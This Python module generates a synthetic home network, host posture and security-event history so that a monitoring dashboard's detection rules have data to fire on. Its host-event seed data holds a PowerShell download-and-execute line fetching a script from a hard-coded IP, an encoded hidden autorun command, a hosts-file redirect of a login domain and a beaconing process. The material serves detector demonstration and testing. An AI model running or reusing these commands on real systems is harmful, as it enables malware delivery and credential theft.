"""Synthetic network generator.

This exists for two reasons, and both of them matter.

**Publishing safety.** Real MACs, hostnames and SSIDs identify your household.
A router BSSID is enough to locate your home through public wardriving
databases; Windows hostnames usually contain a person's actual name. Every
screenshot in the README, every figure in the write-up, and every test fixture
comes from here rather than from a live capture. Sanitising real data after the
fact does not work -- something always survives, and git remembers.

**Reviewability.** Anyone who clones this repo can run ``pnma seed`` and see a
populated dashboard in about a second, without owning any hardware, joining any
network, or waiting a week for interesting events to occur. A project nobody
can evaluate without a lab is a project nobody evaluates.

The generated network is plausible rather than random: a realistic device mix,
correlated diurnal availability, and a small number of genuinely interesting
security events so every detection rule has something to show.

The synthetic *host* posture is generated on the same terms and for a sharper
reason. Publishing this machine's real posture would name, on a host anyone can
tie to the author, which of its defences are switched off -- a worse disclosure
than a MAC address. So the host panel is populated from a fabricated machine
that is deliberately unflattering: controls off, three checks blocked by
privilege and one broken outright, because a demo host with clean posture would
showcase none of the behaviour the module was built for.

The RFC 5737 documentation range is not used, because the dashboard should look
like the private network it is meant to monitor. The OUIs are real and public
(the IEEE registry is public data); the addresses built on them are fabricated.
"""

from __future__ import annotations

import math
import json
import random
import time

from .db import Database
from .fingerprint import resolve_identity

SEED_NETWORK = "10.20.30"  # deliberately not a range anyone reading this uses

# (label, oui, hostname, dhcp opt55, vendor class, is_iot, always_on)
SYNTHETIC_DEVICES = [
    ("Router",           "98:03:8e", "gateway",        [1, 3, 6, 15],           None,          False, True),
    ("Living Room TV",   "b0:a7:37", "roku-living",    [1, 3, 6, 15, 28, 51],   "Roku",        True,  False),
    ("Kitchen Echo",     "fc:65:de", "echo-kitchen",   [1, 3, 6, 15, 119, 252], "AmazonEcho",  True,  True),
    ("Work Laptop",      "10:b6:76", "wsl-thinkpad",   [1, 3, 6, 15, 31, 33],   "MSFT 5.0",    False, False),
    ("Personal Laptop",  "3c:22:fb", "macbook-air",    [1, 121, 3, 6, 15, 119], None,          False, False),
    ("Pixel Phone",      "f4:f5:d8", "pixel-8",        [1, 3, 6, 15, 26, 28],   "android-dhcp", False, False),
    ("iPhone",           "a4:83:e7", "iPhone",         [1, 121, 3, 6, 15, 119], None,          False, False),
    ("Network Printer",  "94:b3:f7", "brother-prn",    [1, 3, 6, 15, 44],       None,          True,  True),
    ("NAS",              "00:11:32", "synology-nas",   [1, 3, 6, 15, 28],       None,          False, True),
    ("Smart Plug",       "24:6f:28", "esp-plug-01",    [1, 3, 6, 15],           "ESP32",       True,  True),
    ("Security Camera",  "cc:9e:a2", "cam-frontdoor",  [1, 3, 6, 15, 42],       None,          True,  True),
    ("Guest Phone",      "d8:3a:dd", None,             [1, 3, 6, 15, 26],       None,          False, False),
]

# Ports each synthetic device listens on. The interesting ones are deliberate.
SYNTHETIC_PORTS = {
    "Router":           [(80, "http", "ARRIS admin"), (443, "https", None), (53, "domain", None)],
    "NAS":              [(22, "ssh", "OpenSSH 9.2"), (445, "microsoft-ds", "Samba 4.17"), (5000, "http", "Synology DSM")],
    "Network Printer":  [(9100, "jetdirect", None), (80, "http", "Brother admin"), (515, "printer", None)],
    "Security Camera":  [(80, "http", "GoAhead 2.5"), (554, "rtsp", None), (23, "telnet", None)],
    "Smart Plug":       [(80, "http", None), (5555, "adb", "Android Debug Bridge")],
    "Work Laptop":      [(3389, "ms-wbt-server", "Microsoft Terminal Services")],
    "Living Room TV":   [(8060, "roku-ecp", None), (1900, "upnp", None)],
    "Kitchen Echo":     [(4070, "amzn-alexa", None)],
    "Personal Laptop":  [],
    "Pixel Phone":      [],
    "iPhone":           [],
    "Guest Phone":      [],
}

# Ports deliberately placed inside ServiceDriftDetection's 24-hour window.
#
# That rule reports services that *appeared* recently -- its query filters
# `p.first_seen >= ctx.now - 86400` -- so a port whose first_seen is days old is
# invisible to it no matter how dangerous the port is. The three services this
# demo is built around are exactly the ones a reader is meant to see judged, so
# each has to have appeared inside the window for the rule that judges it to
# actually run.
#
# This is the honest way to make a demo alert appear: give the generator data
# the real rule fires on. The generator used to hand-write these alerts with
# `db.raise_alert` instead, which produced rows no rule had evaluated -- and for
# 23/tcp, a second row alongside the `profile_deviation` alert the engine really
# did raise, so the demo screenshots showed precisely the duplicate-alert
# fatigue that the correlation engine exists to eliminate.
#
# (device label, port) -> seconds before "now" that the port first appeared.
RECENTLY_APPEARED_PORTS: dict[tuple[str, int], int] = {
    ("Smart Plug", 5555): 7200,        # 2h  -- ADB backdoor, the headline finding
    ("Security Camera", 23): 39600,    # 11h -- telnet, correlates with profile_deviation
    ("Work Laptop", 3389): 68400,      # 19h -- RDP on a trusted laptop
}


def _mac(oui: str, rng: random.Random) -> str:
    return oui + ":" + ":".join(f"{rng.randint(0, 255):02x}" for _ in range(3))


def generate(db: Database, *, days: int = 7, seed: int = 20260824) -> dict:
    """Populate a database with a synthetic but plausible network.

    Deterministic: the same seed always produces the same network, so
    screenshots stay reproducible and tests stay stable.
    """
    rng = random.Random(seed)
    now = time.time()
    sensor_id = "seed-sensor"

    db.register_sensor(sensor_id, "network", hostname="demo-host", version="seed")
    db.execute(
        "INSERT OR REPLACE INTO meta(key, value) VALUES('gateway_ip', ?)",
        (f"{SEED_NETWORK}.1",),
    )

    created: list[dict] = []

    for idx, (label, oui, hostname, opt55, vclass, is_iot, always_on) in enumerate(
        SYNTHETIC_DEVICES
    ):
        ip = f"{SEED_NETWORK}.{1 if idx == 0 else 100 + idx}"

        # The guest phone uses a randomised MAC, which is the realistic case and
        # exercises the fingerprint-based identity path.
        if label == "Guest Phone":
            mac = "02:" + ":".join(f"{rng.randint(0, 255):02x}" for _ in range(5))
        else:
            mac = _mac(oui, rng)

        identity = resolve_identity(
            mac, hostname=hostname, param_request_list=opt55, vendor_class=vclass
        )

        # The router has been there forever; the guest phone arrived an hour ago.
        if label == "Guest Phone":
            first_seen = now - 3600
        elif label == "Smart Plug":
            first_seen = now - 86400 * 2
        else:
            first_seen = now - 86400 * rng.uniform(days, days * 8)

        from . import oui as oui_mod

        db.execute(
            """INSERT OR REPLACE INTO devices(
                   device_id, mac, mac_type, vendor, hostname, dhcp_fingerprint,
                   dhcp_vendor_class, ip, label, first_seen, last_seen, trusted)
               VALUES(?,?,?,?,?,?,?,?,?,?,?,?)""",
            (
                identity.device_id, mac, identity.mac_type,
                oui_mod.lookup(mac), hostname, identity.fingerprint, vclass, ip,
                label if label != "Guest Phone" else None,
                first_seen,
                now - (rng.uniform(0, 120) if always_on else rng.uniform(0, 3600)),
                1 if label not in ("Guest Phone", "Smart Plug") else 0,
            ),
        )
        created.append(
            {"device_id": identity.device_id, "label": label, "ip": ip,
             "mac": mac, "always_on": always_on}
        )

        # Ports
        for port, service, product in SYNTHETIC_PORTS.get(label, []):
            from .collectors.portscan import classify_port

            risk, _ = classify_port(port)
            recent = RECENTLY_APPEARED_PORTS.get((label, port))
            port_first_seen = (
                now - recent if recent is not None
                else first_seen + 60
            )
            db.execute(
                """INSERT OR REPLACE INTO ports(device_id, port, proto, service,
                                                product, first_seen, last_seen, risk)
                   VALUES(?,?,?,?,?,?,?,?)""",
                (identity.device_id, port, "tcp", service, product,
                 port_first_seen, now - 300, risk),
            )

    # ---- availability history with a believable daily rhythm --------------
    step = 300
    samples = int(days * 86400 / step)
    for dev in created:
        for i in range(samples):
            ts = now - (samples - i) * step
            hour = time.localtime(ts).tm_hour
            if dev["always_on"]:
                up = rng.random() > 0.005
            else:
                # Present in the evening, mostly absent during the working day.
                presence = 0.9 if (hour >= 18 or hour <= 7) else 0.35
                up = rng.random() < presence
            rtt = None
            if up:
                base = 2.0 if dev["ip"].endswith(".1") else 8.0
                # A gentle diurnal congestion curve plus noise.
                rtt = base + 6 * math.sin((hour / 24) * 2 * math.pi) ** 2
                rtt += rng.gauss(0, 1.5)
                rtt = max(0.4, rtt)
            db.execute(
                "INSERT INTO availability(ts, device_id, reachable, rtt_ms) "
                "VALUES(?,?,?,?)",
                (ts, dev["device_id"], int(up), rtt),
            )
        db.record_observation(
            source="passive_arp", agent_generated=False, sensor_id=sensor_id,
            device_id=dev["device_id"], mac=dev["mac"], ip=dev["ip"],
        )

    # ---- bindings, including a contested one for the ARP rule -------------
    #
    # 300 seconds, not 600. ArpSpoofDetection groups bindings whose last_seen
    # falls inside its 600s FLAP_WINDOW_S, and it only reports an IP claimed by
    # more than one MAC. Writing the legitimate bindings at exactly now - 600
    # put the gateway's own claim on the window boundary, and since the engine
    # runs a second or two after this generator finishes, it fell out every
    # time -- leaving the rogue MAC as the sole claimant, so the count never
    # exceeded one and the rule produced nothing. The demo's ARP alert was
    # hand-written, which is why nobody noticed the rule was silent.
    #
    # Both claims have to be live for the contest to exist, which is also what
    # real poisoning looks like: the victim and the attacker answering for the
    # same address at the same time.
    for dev in created:
        db.upsert_binding(dev["mac"], dev["ip"], passive=True, ts=now - 300)

    # A second MAC claiming the gateway address: textbook ARP poisoning.
    rogue_mac = "02:42:ac:11:00:07"
    db.upsert_binding(rogue_mac, f"{SEED_NETWORK}.1", passive=True, ts=now - 240)

    # ---- alerts ----------------------------------------------------------
    # Deliberately none. Every alert in the demo database is raised by the real
    # DetectionEngine in `cmd_seed`, from the devices, ports, bindings and
    # availability history written above. The generator's job is to produce
    # evidence worth alerting on, not to assert the conclusions.

    # ---- scan audit trail ------------------------------------------------
    for i in range(24):
        db.log_scan(
            "arp_table_read", f"{SEED_NETWORK}.0/24",
            duration_s=0.1, result=f"{len(created)} devices",
        )
    db.log_scan(
        "port_scan", f"{SEED_NETWORK}.0/24",
        duration_s=42.5, result="19 open ports across 12 hosts",
    )
    db.log_scan(
        "port_scan", "10.99.99.5",
        error="REFUSED (scope): 10.99.99.5 is outside the authorised range",
    )

    # ---- host posture ----------------------------------------------------
    # The machine the agent runs on. Without this the dashboard's top panel is
    # empty in every screenshot taken from the demo database, which is the one
    # panel whose argument is that an unmeasured control must never look like a
    # passing one -- an empty panel makes exactly the opposite impression.
    host = _seed_host_facts(db, now)
    ident = _seed_identity(db, now)
    host_events = _seed_host_events(db, now, created)

    return {
        "host_events": host_events,
        "devices": len(created),
        "availability_samples": len(created) * samples,
        "network": f"{SEED_NETWORK}.0/24",
        "host_facts": host,
        "identity": ident,
    }


# --------------------------------------------------------------- host events

def _seed_host_events(db: Database, now: float, created: list[dict]) -> int:
    """One row of each host-event kind the rules read, plus the two derived
    signals (an ARP sweep by the Smart Plug, an upload spike), so every rule
    in `host_event_rules()` demonstrably fires on the demo -- the same
    contract `test_every_rule_in_the_default_set_produces_an_alert` holds the
    network rules to. Figures are invented; shapes are what the collector
    writes."""
    plug = next((d for d in created if d["label"] == "Smart Plug"), None)
    t = now - 3 * 3600
    rows = [
        ("powershell_block", t + 120, "script block: download_cradle, hidden_window, invoke_expression (412 chars)",
         {"tags": ["download_cradle", "hidden_window", "invoke_expression"], "level": "Warning", "record": 91011,
          "excerpt": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://45.13.7.22/a.ps1')",
          "techniques": ["T1105", "T1564.003", "T1059.001"]}, "high", "T1105"),
        ("service_installed", t + 305, "service installed: aG7kP2xQ -> C:\\Users\\Public\\aG7kP2xQ.exe",
         {"name": "aG7kP2xQ", "path": "C:\\Users\\Public\\aG7kP2xQ.exe", "start": "auto start",
          "tags": ["user_writable_path"], "record": 5522, "sha256": "d41d8cd98f00b204e9800998ecf8427e"},
         "high", "T1543.003"),
        ("service_installed", t + 300, "service installed: WinUpdateSvc -> C:\\Users\\Public\\Libraries\\svchost.exe",
         {"name": "WinUpdateSvc", "path": "C:\\Users\\Public\\Libraries\\svchost.exe", "start": "auto start",
          "tags": ["user_writable_path"], "record": 5521, "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
         "high", "T1543.003"),
        ("autorun_added", t + 310, "autorun added: OneDriveUpdater -> powershell.exe -w hidden -enc SQBFAFgA...",
         {"where": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "OneDriveUpdater",
          "command": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "signed": None, "sha256": None,
          "tags": ["script_host", "obfuscated_or_downloader"]}, "high", "T1547.001"),
        ("software_installed", t - 1800, "installed: AnyDesk 8.1.0 (philandro Software GmbH)",
         {"name": "AnyDesk", "version": "8.1.0", "publisher": "philandro Software GmbH",
          "location": "C:\\Program Files (x86)\\AnyDesk", "tags": ["remote_access"]}, "high", "T1219"),
        ("hidden_dir_created", t + 290, "hidden directory created: C:\\Users\\Public\\Libraries",
         {"path": "C:\\Users\\Public\\Libraries", "attributes": "Hidden, System, Directory",
          "tags": ["user_writable_path", "system_attribute"]}, "medium", "T1564.001"),
        ("log_cleared", t + 3500, "an event log was cleared: Security", {"props": ["Security"], "record": 5530}, "high", "T1070.001"),
        ("connection", t + 600, "powershell.exe -> 45.13.7.22:8443 [script_host_network, uncommon_port]",
         {"raddr": "45.13.7.22", "rport": 8443, "lport": 51422, "pid": 4120, "process": "powershell.exe",
          "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "tags": ["script_host_network", "uncommon_port"]}, "high", "T1105"),
        # SEC555/GCDA host-integrity detections (unelevated, snapshot-diff).
        ("root_cert_added", t + 200, "new trusted root certificate: CN=Interceptor Root CA",
         {"thumbprint": "AABBCCDDEEFF00112233445566778899AABBCCDD", "subject": "CN=Interceptor Root CA, O=Unknown",
          "issuer": "CN=Interceptor Root CA, O=Unknown", "store": "Cert:\\CurrentUser\\Root"}, "medium", "T1553.004"),
        ("hosts_file_changed", t + 210, "hosts file redirect added: 45.13.7.22 login.microsoftonline.com",
         {"entry": "45.13.7.22 login.microsoftonline.com"}, "medium", "T1565.001"),
        ("listening_process", t + 220, "new listener: powershell on 0.0.0.0:4444",
         {"name": "powershell", "port": 4444, "laddr": "0.0.0.0", "pid": 6210,
          "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "script_host_or_userpath": True},
         "high", "T1571"),
        ("powershell_downgrade", t + 230, "PowerShell 2.0 engine started (below v5 -- evades script-block logging)",
         {"engine_version": "2.0", "record": 400123,
          "excerpt": "Engine state is changed from None to Available. NewEngineState=Available EngineVersion=2.0 RunspaceId=..."},
         "high", "T1059.001"),
        # And one attributed row, so the demo shows the agent's own script is
        # visible but not alerted on.
        ("powershell_block", t + 60, "PNMA's own script",
         {"tags": [], "level": "Warning", "record": 91009, "excerpt": "# pnma-agent  $k = Get-ItemProperty ..."}, None, None),
    ]
    n = 0
    for kind, ts, summary, detail, sev, mitre in rows:
        if db.record_host_event(kind=kind, ts=ts, summary=summary, detail=detail, severity=sev,
                                dedup_key=f"seed:{kind}:{int(ts)}", agent_generated=(sev is None),
                                mitre_id=mitre, sensor_id="host"):
            n += 1
    # ARP sweep: every device answered the Smart Plug within a minute.
    if plug:
        for i, d in enumerate(created):
            if d is plug:
                continue
            db.execute(
                "INSERT INTO observations(ts, sensor_id, device_id, mac, ip, source, agent_generated, detail) "
                "VALUES(?,?,?,?,?,?,0,?)",
                (now - 1800 + i * 2, "seed", d["device_id"], d["mac"], d["ip"], "passive_arp",
                 json.dumps({"op": "reply", "hwdst": plug["mac"], "pdst": d["ip"], "solicited_by_agent": False})))
    # Upload spike: 6h of quiet samples, then 10 minutes at 40x.
    sent = 0.0
    for i in range(0, 6 * 3600 + 601, 300):
        ts = now - 6 * 3600 - 600 + i
        rate = 20_000.0 if ts < now - 600 else 1_200_000.0
        sent += rate * 300
        db.execute("INSERT INTO host_counters(ts, adapter, bytes_sent, bytes_recv) VALUES(?,?,?,?)",
                   (ts, "Wi-Fi", sent, sent * 3))
    # Auth events (Security log): a spray, a brute force, a lockout and an
    # addition to Administrators, so each auth rule fires on the demo.
    ta = now - 300
    for i, acct in enumerate(('admin', 'guest', 'test', 'backup', 'sql')):
        db.record_auth_event(ts=ta - i * 20, event_id=4625, account=acct, domain='DESKTOP',
                             source_ip='185.220.101.47', logon_type='3', status='0xC000006A',
                             detail={'TargetUserName': acct, 'IpAddress': '185.220.101.47'},
                             dedup_key='seed:spray:%d' % i)
    for i in range(9):
        db.record_auth_event(ts=ta - i * 10, event_id=4625, account='arvind', domain='DESKTOP',
                             source_ip='192.168.0.55', logon_type='3', status='0xC000006A',
                             detail={'TargetUserName': 'arvind', 'IpAddress': '192.168.0.55'},
                             dedup_key='seed:brute:%d' % i)
    db.record_auth_event(ts=ta, event_id=4740, account='arvind', domain=None, source_ip=None,
                         logon_type=None, status=None,
                         detail={'TargetUserName': 'arvind', 'SubjectUserName': 'DESKTOP$'},
                         dedup_key='seed:lockout')
    db.record_auth_event(ts=ta - 3600, event_id=4732, account='Administrators', domain=None,
                         source_ip=None, logon_type=None, status=None,
                         detail={'TargetUserName': 'Administrators', 'TargetSid': 'S-1-5-32-544',
                                 'MemberName': 'svc_helper', 'SubjectUserName': 'arvind'},
                         dedup_key='seed:newadmin')
    # Connection endpoints: a regular beacon (low-jitter, ~10 min) and a
    # brand-new external destination for a non-browser process, so the
    # beaconing and new_external_destination rules fire on the demo.
    import json as _json
    beacon_samples = [now - 3 * 3600 + i * 600 for i in range(18)]
    db.execute("INSERT INTO connection_endpoints(process, path, raddr, rport, first_seen, last_seen, sample_count, samples) VALUES(?,?,?,?,?,?,?,?)",
               ('svc_helper.exe', 'C:/Users/Public/svc_helper.exe', '185.220.101.47', 8443,
                beacon_samples[0], beacon_samples[-1], len(beacon_samples), _json.dumps(beacon_samples)))
    db.execute("INSERT INTO connection_endpoints(process, path, raddr, rport, first_seen, last_seen, sample_count, samples) VALUES(?,?,?,?,?,?,?,?)",
               ('svc_probe.exe', 'C:/Users/Public/svc_probe.exe', '45.13.7.22', 443,
                now - 300, now - 300, 1, _json.dumps([now - 300])))
    return n


# ---------------------------------------------------------------- host facts
#
# Posture of the machine the agent runs on. Seeded for the same two reasons the
# network is: a dashboard panel that is empty in every screenshot documents
# nothing, and the alternative -- publishing this host's real posture -- says
# out loud which defences are off on a named machine. A synthetic host is the
# only safe way to show the panel working.
#
# The set below deliberately reproduces the *shape* of a real collection rather
# than a flattering one:
#
#   * all three states appear, and `unknown` appears in both its forms -- three
#     checks blocked by privilege and one that failed for another reason. The
#     dashboard's coverage banner counts and explains those separately, and a
#     demo with only the privilege case would leave half that logic unexercised
#     in every screenshot.
#   * `elevated` is derived by the API as "nothing needing admin came back
#     unknown", so seeding three admin-blocked checks puts the demo in the
#     unelevated state -- which is what a reader running `pnma seed` on their
#     own machine will most likely see, and the state the whole three-value
#     design exists to make honest.
#   * several findings map to no ATT&CK technique in `FACT_TECHNIQUES`, so they
#     surface on the panel without raising an alert. A demo where every finding
#     alerts would misrepresent how noisy the module is.
#
# (fact_key, category, title, state, value, expected, reason, needs_admin, evidence)
SYNTHETIC_HOST_FACTS: list[tuple] = [
    # -- defender ----------------------------------------------------------
    ("defender.realtime", "defender", "Real-time protection", "ok",
     "enabled", "enabled", None, False, None),
    ("defender.tamper_protection", "defender", "Tamper Protection", "finding",
     "disabled", "enabled",
     "Tamper Protection stops another process from turning Defender off. With "
     "it disabled, the first thing an intruder with local admin does is "
     "disable real-time protection, and nothing prevents it.",
     False, None),
    ("defender.pua", "defender",
     "Potentially unwanted application protection", "finding",
     "disabled", "enabled",
     "PUA blocking catches bundled adware and the 'system optimiser' class of "
     "software that ships coin miners. Low severity on its own.",
     False, None),
    ("defender.network_protection", "defender", "Network protection", "ok",
     "enabled", "enabled", None, False, None),
    ("defender.removable_scan", "defender", "Removable drive scanning", "ok",
     "enabled", "enabled", None, False, None),
    ("defender.full_scan", "defender", "Full scan history", "finding",
     "no full scan in 61 days", "a full scan within 30 days",
     "Real-time protection only sees files as they are touched. Anything "
     "dormant that arrived before the current signatures has never been "
     "looked at.",
     False, None),
    ("defender.exclusions", "defender", "Defender exclusion list", "unknown",
     None, "no unexpected exclusions",
     "Reading the exclusion list requires Administrator. This is the check an "
     "intruder most wants to be unreadable: an excluded directory is a "
     "sanctioned place to keep tools.",
     True, None),

    # -- audit and logging -------------------------------------------------
    ("audit.cmdline", "audit", "Process creation command line (4688)",
     "finding", "not logged", "logged",
     "Without command-line capture, 4688 records that powershell.exe ran but "
     "not what it ran. Most of the forensic value of process auditing is in "
     "the argument string.",
     False, None),
    ("audit.policy", "audit", "Logon / process audit policy", "unknown",
     None, "success and failure auditing enabled",
     "auditpol requires Administrator. Unmeasured -- not confirmed absent.",
     True, None),
    ("audit.log_cleared_security", "audit",
     "Security audit log cleared (T1070.001)", "unknown",
     None, "no 1102 events",
     "Querying the Security log requires Administrator. Note that the "
     "unprivileged failure mode here is a 'No events were found' message "
     "rather than an access error, so this check reports unknown rather than "
     "letting an unreadable log look like a clean one.",
     True, None),
    ("audit.log_cleared_system", "audit", "Non-Security event logs cleared",
     "ok", "no clear events in 30 days", "no clear events", None, False, None),
    ("powershell.script_block", "audit", "PowerShell script block logging",
     "finding", "disabled", "enabled",
     "Script block logging is the single most useful Windows log for "
     "post-incident work: it records deobfuscated PowerShell as it executes, "
     "including code that never touched disk.",
     False, None),
    ("powershell.module", "audit", "PowerShell module logging", "finding",
     "disabled", "enabled",
     "Module logging records pipeline execution details. Useful, and much "
     "noisier than script block logging.",
     False, None),
    ("powershell.transcription", "audit", "PowerShell transcription",
     "finding", "disabled", "enabled",
     "Transcription writes full session transcripts to disk. Off by default "
     "and the least important of the three.",
     False, None),

    # -- persistence -------------------------------------------------------
    ("persistence.system_tasks", "persistence",
     "Non-Microsoft scheduled tasks running as SYSTEM", "finding",
     "2 tasks", "reviewed and expected",
     "A scheduled task running as SYSTEM is a persistence mechanism with the "
     "highest privileges the machine has. These two are plausible vendor "
     "updaters; plausible is exactly what a good implant looks like.",
     False,
     {"tasks": [
         "\\DemoVendor\\UpdateChecker",
         "\\SynthCorp\\TelemetryUpload",
     ], "count": 2}),

    # -- network -----------------------------------------------------------
    ("network.smb1", "network", "SMBv1 protocol", "ok",
     "disabled", "disabled", None, False, None),
    ("network.smb_signing", "network", "SMB signing required", "finding",
     "not required", "required",
     "Without required signing, an attacker who can reach this host over SMB "
     "can relay an authentication attempt to it. This is the host-side half "
     "of the LLMNR/NBT-NS poisoning the network rules watch for.",
     False, None),
    ("network.smb_reachable", "network", "SMB reachable from the network",
     "finding", "445/tcp listening", "not reachable, or firewalled to a subnet",
     "SMB is reachable from the local network. Combined with signing not "
     "being required, that is a relay target rather than a theoretical one.",
     False, None),

    # -- drivers -----------------------------------------------------------
    # The one `unknown` that is NOT a privilege problem. Elevation will not fix
    # it, the dashboard says so separately, and a demo without this case would
    # imply every unknown is an elevation prompt away from being answered.
    ("drivers.unsigned", "drivers", "Non-Microsoft kernel drivers running",
     "unknown", None, "all loaded drivers signed and expected",
     "The driver query returned no usable result. This is a collector failure "
     "rather than a privilege one -- running elevated will not resolve it, and "
     "the reason it failed is the thing to investigate.",
     False, None),
]

# States these facts held on the previous synthetic run, so `changed_at` is
# populated by the same upsert path a real collector goes through rather than
# being written directly.
#
# Both entries tell a story the panel is built to tell. Tamper Protection went
# from on to off, which is an event rather than standing debt -- the difference
# `record_host_fact`'s return value exists to express. The Security log check
# went from answering to not answering, which is the harder case: coverage that
# was lost, on the exact check whose unprivileged failure mode is a message
# that reads like a pass.
HOST_FACT_HISTORY: dict[str, str] = {
    "defender.tamper_protection": "ok",
    "audit.log_cleared_security": "ok",
}


def _seed_host_facts(db: Database, now: float) -> dict:
    """Write the synthetic host posture, through the real upsert path.

    Two passes. The first writes each fact as it stood three days ago, which
    gives every row a `first_seen` in the past instead of a demo where the
    machine appears to have been discovered this second. The second writes the
    current state, and `record_host_fact` sets `changed_at` on exactly the rows
    whose state differs -- so the "changed 2 hours ago" badge on the dashboard
    is produced by the same code that would produce it on a real host, not
    stamped in by the generator.
    """
    earlier = now - 3 * 86400

    for spec in SYNTHETIC_HOST_FACTS:
        key, category, title, state, value, expected, reason, needs_admin, evidence = spec
        was = HOST_FACT_HISTORY.get(key, state)
        db.record_host_fact(
            fact_key=key, category=category, title=title, state=was,
            # A fact recorded in its previous state must not carry the current
            # measurement with it. Writing "disabled" alongside state `ok`
            # would put a self-contradicting row in the history.
            value=value if was == state else None,
            expected=expected,
            reason=reason if was == state else None,
            needs_admin=needs_admin,
            evidence=evidence if was == state else None,
            ts=earlier,
        )

    changed = 0
    for spec in SYNTHETIC_HOST_FACTS:
        key, category, title, state, value, expected, reason, needs_admin, evidence = spec
        if db.record_host_fact(
            fact_key=key, category=category, title=title, state=state,
            value=value, expected=expected, reason=reason,
            needs_admin=needs_admin, evidence=evidence,
            # Two hours ago rather than `now`: a posture reading is only ever as
            # fresh as the last collector run, and a demo whose timestamp says
            # "just now" on every reload misrepresents that.
            ts=now - 7200,
        ):
            changed += 1

    states: dict[str, int] = {}
    for spec in SYNTHETIC_HOST_FACTS:
        states[spec[3]] = states.get(spec[3], 0) + 1

    return {
        "total": len(SYNTHETIC_HOST_FACTS),
        "changed": changed,
        "blocked_by_privilege": sum(
            1 for s in SYNTHETIC_HOST_FACTS if s[3] == "unknown" and s[7]
        ),
        **states,
    }


def resolve_one_alert(db: Database) -> str | None:
    """Mark one real alert resolved, so the demo shows a resolved row.

    The dashboard renders open and resolved alerts differently, and a demo
    database in which nothing has ever been resolved leaves that half of the
    view untested in every screenshot.

    What is asserted here is only the *status transition* -- "this device came
    back online and the alert was closed". The alert itself was raised by the
    real engine from the seeded availability history, which is the part that
    matters: the generator no longer invents alerts, it only closes one.

    An `availability` alert is chosen because it is the one family whose
    resolution is unambiguously benign; resolving a synthetic C2 finding would
    suggest the demo had investigated and cleared a compromise. Returns the
    dedup_key resolved, or None when the engine happened to raise no
    availability alert at all -- in which case the demo simply has no resolved
    row, which is preferable to fabricating one.
    """
    row = db.query_one(
        "SELECT dedup_key FROM alerts WHERE rule_id = 'availability' "
        "AND status = 'open' ORDER BY first_seen, dedup_key LIMIT 1"
    )
    if row is None:
        return None
    db.execute(
        "UPDATE alerts SET status = 'resolved' WHERE dedup_key = ?",
        (row["dedup_key"],),
    )
    return row["dedup_key"]


# --------------------------------------------------------------- identity

# Three synthetic accounts, deliberately mixed: one well-kept mailbox with a
# single gap, one social account nobody has looked at, and a bank login whose
# review has lapsed. Handles are RFC 2606 reserved domains -- nothing here can
# be looked up, phished or matched to a person.
SYNTHETIC_ACCOUNTS = [
    ("demo-mail", "google", "email", "Main mailbox", "demo@example.com", 90, {
        "mfa": ("ok", "passkey + TOTP", None),
        "mfa_phishing_resistant": ("ok", "passkey", None),
        "password_unique": ("ok", "generated, in manager", None),
        "recovery_reviewed": ("ok", "1 email, 1 phone", None),
        "sessions_reviewed": ("finding", "3 sessions", "an unrecognised Linux session is signed in"),
        "login_alerts": ("ok", "on", None),
    }),
    ("demo-social", "meta", "social", "Photo account", "demo.social@example.org", 90, {}),
    ("demo-bank", "bank", "finance", "Everyday banking", None, 30, {
        "mfa": ("ok", "SMS", "SMS is a second factor but not a phishing-resistant one"),
        "mfa_phishing_resistant": ("finding", "SMS only", "bank offers a hardware token; not enrolled"),
        "password_unique": ("ok", "generated", None),
    }),
]


def _seed_identity(db: Database, now: float) -> dict:
    """Write the synthetic identity register through the real attest path.

    The bank account's attestations are back-dated past its 30-day window so
    the demo shows the third state -- stale -- rather than only fresh ok and
    finding. Done by rewriting attested_at after the fact, because `attest`
    stamps the clock itself and that is the behaviour worth keeping.
    """
    from . import identity as I

    for account_id, provider, category, label, handle, review_days, controls in SYNTHETIC_ACCOUNTS:
        I.add_account(db, account_id, provider=provider, category=category, label=label,
                      handle=handle, review_days=review_days)
        for control, (state, value, reason) in controls.items():
            I.attest(db, account_id, control, state, value=value, reason=reason)
    db.execute(
        "UPDATE identity_facts SET attested_at = ? WHERE account_id = 'demo-bank'",
        (now - 45 * 86400,),
    )
    rep = I.report(db, now=now)["summary"]
    return {k: rep[k] for k in ("accounts", "ok", "finding", "unknown", "stale")}
